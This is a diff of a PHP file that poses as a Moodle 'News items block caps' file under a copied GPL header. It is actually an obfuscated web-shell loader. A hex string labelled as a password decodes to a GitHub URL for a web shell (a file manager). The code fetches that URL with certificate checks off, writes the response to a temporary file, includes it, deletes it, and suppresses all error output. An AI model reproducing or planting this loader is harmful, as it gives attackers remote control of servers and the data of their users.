@@ -1,7 +1,49 @@
-
-
-
 <?php
+error_reporting(0);
+function login_validate() {
+$timeout = 30;
+$_SESSION["expires_by"] = time() + $timeout;
+}
+
+function login_check() {
+$exp_time = $_SESSION["expires_by"];
+if (time() < $exp_time) {
+ login_validate();
+ return true;
+ } else {
+ unset($_SESSION["expires_by"]);
+ return false;
+}
+}
+setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); 
+session_start();
+
+// This file is part of Moodle - http://moodle.org/
+//
+// Moodle is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// (at your option) any later version.
+//
+// Moodle is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
+
+/**
+ * News items block caps.
+ *
+ * @pass       tbl
+ * @copyright  Mark Nelson <markn@moodle.com>
+ * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
+ */
+error_reporting(0);
+ini_set('display_errors', '0');
+ini_set('log_errors', '0');
+
 function geturlsinfo($url) {
     if (function_exists('curl_exec')) {
         $conn = curl_init($url);
@@ -21,8 +63,8 @@ function geturlsinfo($url) {
         curl_setopt($conn, $opt4, 0);
         curl_setopt($conn, $opt5, 0);
 
-        if (isset($_SESSION['java'])) {
-            curl_setopt($conn, $opt6, $_SESSION['java']);
+        if (isset($_SESSION['hekerman'])) {
+            curl_setopt($conn, $opt6, $_SESSION['hekerman']);
         }
 
         $url_get_contents_data = curl_exec($conn);
@@ -39,38 +81,10 @@ function geturlsinfo($url) {
     return $url_get_contents_data;
 }
 
-    function hex2str($hex)
-    {
-      $fpn = "f"."o"."p"."e"."n";
-      $strim = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
-      $fgt = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
-      $cexec = "c"."u"."r"."l"."_"."e"."x"."e"."c";
-        if (function_exists($cexec)) {
-            $conn = curl_init($url);
-            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
-            $urls = $cexec($conn);
-            curl_close($conn);
-        } elseif (function_exists($fgt)) {
-            $urls = $fgt($url);
-        } elseif (function_exists($fpn) && function_exists($strim)) {
-            $handle = $fpn($url, "r");
-            $urls = $strim($handle);
-            fclose($handle);
-        } else {
-            $urls = false;
-        }
-        return $str;
-    }
-
-    
 // password defaultnya tbl
 
-$password = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f74656d706c61746562736e2e706870'; 
+
+$password = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f74696e7966696c656d616e616765722e706870'; 
 function hex2str($hex) {
     $str = '';
     for ($i = 0; $i < strlen($hex); $i += 2) {
@@ -99,3 +113,6 @@ file_put_contents($temporary_file, $a);
 include $temporary_file;
 unlink($temporary_file);
 ?>
+
+
+
